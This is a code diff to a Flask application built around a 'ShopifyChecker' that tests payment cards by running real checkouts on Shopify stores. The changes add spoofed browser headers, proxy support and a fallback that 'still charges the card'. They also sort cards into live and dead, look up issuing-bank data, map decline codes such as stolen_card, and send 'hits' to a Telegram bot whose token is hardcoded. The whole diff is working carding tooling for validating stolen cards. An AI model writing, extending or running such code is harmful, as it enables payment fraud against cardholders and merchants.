@@ -17,6 +17,12 @@ from flask import Flask, render_template, request, jsonify, session, redirect, u
 app = Flask(__name__)
 app.secret_key = os.environ.get("SESSION_SECRET", secrets.token_hex(32))
 
+
+@app.errorhandler(Exception)
+def _json_error(e):
+    code = getattr(e, "code", 500)
+    return jsonify({"type": "dead", "detail": f"Server error: {str(e)}", "error": str(e)}), (code if isinstance(code, int) else 500)
+
 # ---------- Key store ----------
 _keys_lock = threading.Lock()
 VALID_KEYS = {}  # key -> {'expiry': datetime, 'name': str}
@@ -191,7 +197,7 @@ def require_auth(f):
 
 
 # ---------- Owner Telegram bot (background thread) ----------
-OWNER_BOT_TOKEN = os.environ.get("OWNER_BOT_TOKEN", "8326280463:AAFhT6F4m5gFaKReNtLVk5DqssVKyYLjrxg")
+OWNER_BOT_TOKEN = os.environ.get("OWNER_BOT_TOKEN", "7980016283:AAFYGDiIvqE3tCfswBrF0tm-OQhfuiK00xg")
 OWNER_CHAT_ID = str(os.environ.get("OWNER_CHAT_ID", "7604528850"))
 
 
@@ -504,17 +510,29 @@ class ShopifyChecker:
         return _rand.choice(pool)
 
     async def fetch_products(self, domain: str) -> Tuple[bool, any]:
+        _hdrs = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": f"https://{domain}/",
+        }
         candidate_urls = [
+            f"https://{domain}/products.json?limit=250",
+            f"https://{domain}/collections/all/products.json?limit=250",
+            f"https://{domain}/collections/frontpage/products.json?limit=250",
+            f"https://{domain}/collections/shop-all/products.json?limit=250",
+            f"https://{domain}/collections/new/products.json?limit=250",
             f"https://{domain}/products.json",
-            f"https://{domain}/collections/all/products.json",
         ]
         try:
             products = []
             for url in candidate_urls:
                 try:
                     async with self.session.get(
-                        url, timeout=aiohttp.ClientTimeout(total=10),
-                        proxy=self.proxy or None
+                        url, timeout=aiohttp.ClientTimeout(total=15),
+                        proxy=self.proxy or None, headers=_hdrs,
                     ) as resp:
                         if resp.status != 200:
                             continue
@@ -528,30 +546,31 @@ class ShopifyChecker:
             if not products:
                 return False, "Site Error - Cannot access products"
 
-            min_price = float("inf")
-            min_product = None
+            def _pick_best(product_list, available_only=True):
+                min_price = float("inf")
+                best = None
+                for product in product_list:
+                    if not product.get("variants"):
+                        continue
+                    for variant in product["variants"]:
+                        if available_only and not variant.get("available", False):
+                            continue
+                        try:
+                            price = variant.get("price", "0")
+                            price = float(str(price).replace(",", ""))
+                            if 0 < price < min_price:
+                                min_price = price
+                                best = {
+                                    "price": f"{price:.2f}",
+                                    "variant_id": str(variant["id"]),
+                                    "handle": product["handle"],
+                                }
+                        except (ValueError, TypeError, KeyError):
+                            continue
+                return best
 
-            for product in products:
-                if not product.get("variants"):
-                    continue
-                for variant in product["variants"]:
-                    if not variant.get("available", False):
-                        continue
-                    try:
-                        price = variant.get("price", "0")
-                        if isinstance(price, str):
-                            price = float(price.replace(",", ""))
-                        else:
-                            price = float(price)
-                        if price < min_price and price > 0:
-                            min_price = price
-                            min_product = {
-                                "price": f"{price:.2f}",
-                                "variant_id": str(variant["id"]),
-                                "handle": product["handle"],
-                            }
-                    except (ValueError, TypeError, KeyError):
-                        continue
+            # Prefer available, fall back to any product (still charges the card)
+            min_product = _pick_best(products, available_only=True) or _pick_best(products, available_only=False)
 
             if min_product:
                 return True, min_product
@@ -564,17 +583,26 @@ class ShopifyChecker:
             return False, f"Error: {str(e)}"
 
     async def fetch_all_products(self, domain: str) -> Tuple[bool, any]:
+        _hdrs = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Language": "en-US,en;q=0.9",
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": f"https://{domain}/",
+        }
         candidate_urls = [
             f"https://{domain}/products.json?limit=250",
             f"https://{domain}/collections/all/products.json?limit=250",
             f"https://{domain}/collections/frontpage/products.json?limit=250",
+            f"https://{domain}/collections/shop-all/products.json?limit=250",
+            f"https://{domain}/collections/new/products.json?limit=250",
         ]
         last_status = None
         for url in candidate_urls:
             try:
                 async with self.session.get(
                     url, timeout=aiohttp.ClientTimeout(total=15),
-                    proxy=self.proxy or None
+                    proxy=self.proxy or None, headers=_hdrs,
                 ) as resp:
                     last_status = resp.status
                     if resp.status != 200:
@@ -642,7 +670,10 @@ class ShopifyChecker:
                 connector=connector, timeout=aiohttp.ClientTimeout(total=30)
             )
 
-            domain = domain.replace("https://", "").replace("http://", "").strip("/")
+            # Always extract just the hostname — strip any paths/locales the user may paste
+            _raw_input = domain if "://" in domain else f"https://{domain}"
+            _parsed = urlparse(_raw_input)
+            domain = (_parsed.netloc or _parsed.path).split("/")[0]
             base_url = f"https://{domain}"
 
             if selected_variant:
@@ -717,11 +748,25 @@ class ShopifyChecker:
             }
 
             cart_url = f"{base_url}/cart/add.js"
-            await self.session.post(cart_url, json={"id": variant_id}, headers=headers)
+            cart_resp = await self.session.post(cart_url, json={"id": variant_id}, headers=headers)
+            await cart_resp.read()
 
             checkout_url = f"{base_url}/checkout/"
             resp = await self.session.post(checkout_url, headers=headers)
+            await resp.read()
             checkout_url = str(resp.url)
+
+            # If redirect landed on a non-checkout page, force a GET to /checkout
+            if "/checkouts/" not in checkout_url:
+                resp2 = await self.session.get(f"{base_url}/checkout", headers=headers)
+                await resp2.read()
+                checkout_url = str(resp2.url)
+            # Still not a checkout — cart may be empty; retry add+checkout once
+            if "/checkouts/" not in checkout_url:
+                await self.session.post(cart_url, json={"id": variant_id, "quantity": 1}, headers=headers)
+                resp3 = await self.session.get(f"{base_url}/checkout", headers=headers)
+                await resp3.read()
+                checkout_url = str(resp3.url)
 
             attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
             attempt_token = (
@@ -1409,10 +1454,10 @@ class ShopifyChecker:
                 if receipt_id is None:
                     return False, err_msg or "Error processing card", {}
 
-            await asyncio.sleep(5)
+            await asyncio.sleep(1)
 
             poll_json = {
-                "query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}} __typename}}}",
+                "query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}} __typename}}}",
                 "variables": {
                     "receiptId": receipt_id,
                     "sessionToken": sst,
@@ -1420,27 +1465,53 @@ class ShopifyChecker:
                 "operationName": "PollForReceipt",
             }
 
-            for i in range(3):
+            # Poll up to 30 seconds total, respecting Shopify's pollDelay
+            text = ""
+            elapsed = 0
+            max_poll_sec = 30
+            for _ in range(40):
                 resp = await self.session.post(
                     graphql_url, json=poll_json, headers=headers
                 )
                 text = await resp.text()
 
-                if "WaitingReceipt" not in text:
+                if "WaitingReceipt" not in text and "ProcessingReceipt" not in text:
+                    break  # got a final result
+
+                # Respect Shopify's pollDelay (in ms); default 2 s if missing
+                poll_delay_ms = 2000
+                try:
+                    import json as _ppj
+                    _pr = _ppj.loads(text)
+                    poll_delay_ms = (
+                        _pr.get("data", {})
+                        .get("receipt", {})
+                        .get("pollDelay", 2000)
+                    ) or 2000
+                except Exception:
+                    pass
+
+                wait_sec = min(poll_delay_ms / 1000.0, 5.0)
+                elapsed += wait_sec
+                if elapsed >= max_poll_sec:
                     break
+                await asyncio.sleep(wait_sec)
 
-                await asyncio.sleep(5)
-
-            if "WaitingReceipt" in text:
+            if "WaitingReceipt" in text or "ProcessingReceipt" in text:
                 return False, "Timeout - Change proxy or site", {}
 
-            resp_json = await resp.json()
+            try:
+                import json as _pj
+                resp_json = _pj.loads(text)
+            except Exception:
+                resp_json = {}
 
             result_info = {
                 "amount": running_total,
                 "currency": currency,
                 "gateway": payment_name,
                 "email": email,
+                "raw_response": text,
             }
 
             # Detect poll-level GQL errors (schema/validation errors) before processing
@@ -1499,7 +1570,26 @@ class ShopifyChecker:
                     self.extract_between(text, '"messageUntranslated":"', '"') or ""
                 )
 
-            error_detail = message_untranslated or code or "Unknown Error"
+            # Map raw codes to readable labels when no human message is available
+            _CODE_LABELS = {
+                "card_declined":          "Card Declined",
+                "generic_decline":        "Generic Decline",
+                "do_not_honor":           "Do Not Honor",
+                "insufficient_funds":     "Insufficient Funds",
+                "invalid_cvc":            "Invalid CVV",
+                "incorrect_cvc":          "Incorrect CVV",
+                "invalid_number":         "Invalid Card Number",
+                "incorrect_number":       "Incorrect Card Number",
+                "expired_card":           "Expired Card",
+                "lost_card":              "Lost Card",
+                "stolen_card":            "Stolen Card",
+                "pickup_card":            "Pick Up Card",
+                "restricted_card":        "Restricted Card",
+                "transaction_not_allowed":"Transaction Not Allowed",
+                "card_velocity_exceeded": "Card Velocity Exceeded",
+            }
+            code_label = _CODE_LABELS.get(code.lower(), code)
+            error_detail = message_untranslated or code_label or "Unknown Error"
             text_lower = text.lower()
             code_lower = code.lower()
 
@@ -1955,9 +2045,11 @@ def test_bot():
 @app.route("/check", methods=["POST"])
 @require_auth
 def check():
+    """Process a SINGLE card per request so Render's proxy never times out.
+    The frontend loops through cards and calls this once per card."""
     data = request.json
     site = (data.get("site") or "").strip()
-    cards_raw = (data.get("cards") or "").strip()
+    card_line = (data.get("card") or "").strip()
     proxy = (data.get("proxy") or "").strip() or None
     bot = (data.get("bot") or "").strip() or None
     ship_name = (data.get("ship_name") or "").strip() or None
@@ -1966,98 +2058,77 @@ def check():
 
     if not site:
         return jsonify({"error": "Site URL is required"}), 400
-    if not cards_raw:
-        return jsonify({"error": "No cards provided"}), 400
+    if not card_line:
+        return jsonify({"error": "No card provided"}), 400
 
-    lines = [l.strip() for l in cards_raw.splitlines() if l.strip()]
+    parts = card_line.split("|")
+    if len(parts) != 4:
+        return jsonify({"type": "dead", "detail": f"{card_line} - Invalid format"})
 
-    async def process_all():
-        results = {"cvv": [], "ccn": [], "dead": []}
+    cc, mes, ano, cvv_val = parts
+    if len(ano) == 2:
+        ano = "20" + ano
 
-        for card_line in lines:
-            parts = card_line.split("|")
-            if len(parts) != 4:
-                results["dead"].append(f"{card_line} - Invalid format")
-                continue
+    async def process_one():
+        checker = ShopifyChecker()
+        success, message, info = await checker.check_card(
+            site, cc, mes, ano, cvv_val, proxy, custom_address, selected_variant, ship_name
+        )
 
-            cc, mes, ano, cvv_val = parts
-            if len(ano) == 2:
-                ano = "20" + ano
+        card_str = f"{cc}|{mes}|{ano}|{cvv_val}"
+        bin_info = {}
+        if success:
+            bin_info = await bin_lookup_async(cc)
 
-            checker = ShopifyChecker()
-            try:
-                success, message, info = await checker.check_card(
-                    site,
-                    cc,
-                    mes,
-                    ano,
-                    cvv_val,
-                    proxy,
-                    custom_address,
-                    selected_variant,
-                    ship_name,
-                )
-            except Exception as e:
-                results["dead"].append(f"{cc}|{mes}|{ano}|{cvv_val} - Error: {str(e)}")
-                continue
+        currency = (info or {}).get("currency", "")
+        amount = (info or {}).get("amount", "")
+        try:
+            amount_fmt = f"${float(amount):.2f}" if amount else ""
+        except Exception:
+            amount_fmt = f"${amount}" if amount else ""
 
-            card_str = f"{cc}|{mes}|{ano}|{cvv_val}"
-            bin_info = {}
+        bin_str = ""
+        if bin_info:
+            flag = country_flag_emoji(bin_info.get("country_code", ""))
+            parts_bin = [
+                (bin_info.get("scheme") or "").upper(),
+                (bin_info.get("type") or "").upper(),
+            ]
+            bank = bin_info.get("bank", "")
+            country_name = bin_info.get("country_name", "")
+            bin_str = " | ".join(p for p in parts_bin if p)
+            if bank:
+                bin_str += f" | {bank.upper()}"
+            if country_name:
+                bin_str += f" | {country_name.upper()} {flag}".rstrip()
 
-            if success:
-                bin_info = await bin_lookup_async(cc)
+        detail = f"{card_str} - {message}"
+        if amount_fmt:
+            detail += f" [{amount_fmt}]"
+        if bin_str:
+            detail += f" ⟨{bin_str}⟩"
 
-            currency = (info or {}).get("currency", "")
-            amount = (info or {}).get("amount", "")
-            try:
-                amount_fmt = f"${float(amount):.2f}" if amount else ""
-            except Exception:
-                amount_fmt = f"${amount}" if amount else ""
+        raw = (info or {}).get("raw_response", "")
 
-            bin_str = ""
-            if bin_info:
-                flag = country_flag_emoji(bin_info.get("country_code", ""))
-                parts_bin = [
-                    (bin_info.get("scheme") or "").upper(),
-                    (bin_info.get("type") or "").upper(),
-                ]
-                bank = bin_info.get("bank", "")
-                country_name = bin_info.get("country_name", "")
-                bin_str = " | ".join(p for p in parts_bin if p)
-                if bank:
-                    bin_str += f" | {bank.upper()}"
-                if country_name:
-                    bin_str += f" | {country_name.upper()} {flag}".rstrip()
+        if success:
+            msg_lower = message.lower()
+            is_cvv = any(k in msg_lower for k in ["cvv", "cvc", "zip", "postal", "security"])
+            hit_type = "cvv" if is_cvv else "ccn"
 
-            detail = f"{card_str} - {message}"
-            if amount_fmt:
-                detail += f" [{amount_fmt}]"
-            if bin_str:
-                detail += f" ⟨{bin_str}⟩"
+            if bot:
+                status = "CVV" if is_cvv else "CHARGED"
+                await send_telegram_hit(bot, card_str, status, message, info or {}, bin_info)
 
-            if success:
-                msg_lower = message.lower()
-                is_cvv = any(
-                    k in msg_lower for k in ["cvv", "cvc", "zip", "postal", "security"]
-                )
-                hit_type = "cvv" if is_cvv else "ccn"
-                results[hit_type].append(detail)
-
-                if bot:
-                    status = "CVV" if is_cvv else "CHARGED"
-                    await send_telegram_hit(
-                        bot, card_str, status, message, info or {}, bin_info
-                    )
-            else:
-                results["dead"].append(detail)
-
-        return results
+            return {"type": hit_type, "detail": detail, "raw": raw}
+        else:
+            return {"type": "dead", "detail": detail, "raw": raw}
 
     try:
-        results = asyncio.run(process_all())
-        return jsonify(results)
+        result = asyncio.run(process_one())
+        return jsonify(result)
     except Exception as e:
-        return jsonify({"error": str(e), "cvv": [], "ccn": [], "dead": []}), 500
+        card_str = f"{cc}|{mes}|{ano}|{cvv_val}"
+        return jsonify({"type": "dead", "detail": f"{card_str} - Error: {str(e)}"})
 
 
 @app.route("/site_countries", methods=["POST"])
@@ -2069,7 +2140,8 @@ def site_countries():
     if not site:
         return jsonify({"error": "Site URL required"}), 400
 
-    domain = site.replace("https://", "").replace("http://", "").strip("/")
+    _p = urlparse(site if "://" in site else f"https://{site}")
+    domain = (_p.netloc or _p.path).split("/")[0]
     proxy_url = parse_proxy_string(proxy_str) if proxy_str else None
 
     def _parse_country_options(html_text):
@@ -2279,7 +2351,8 @@ def site_products():
     if not site:
         return jsonify({"error": "Site URL is required"}), 400
 
-    domain = site.replace("https://", "").replace("http://", "").strip("/")
+    _p = urlparse(site if "://" in site else f"https://{site}")
+    domain = (_p.netloc or _p.path).split("/")[0]
     proxy_url = parse_proxy_string(proxy_str) if proxy_str else None
 
     async def fetch():
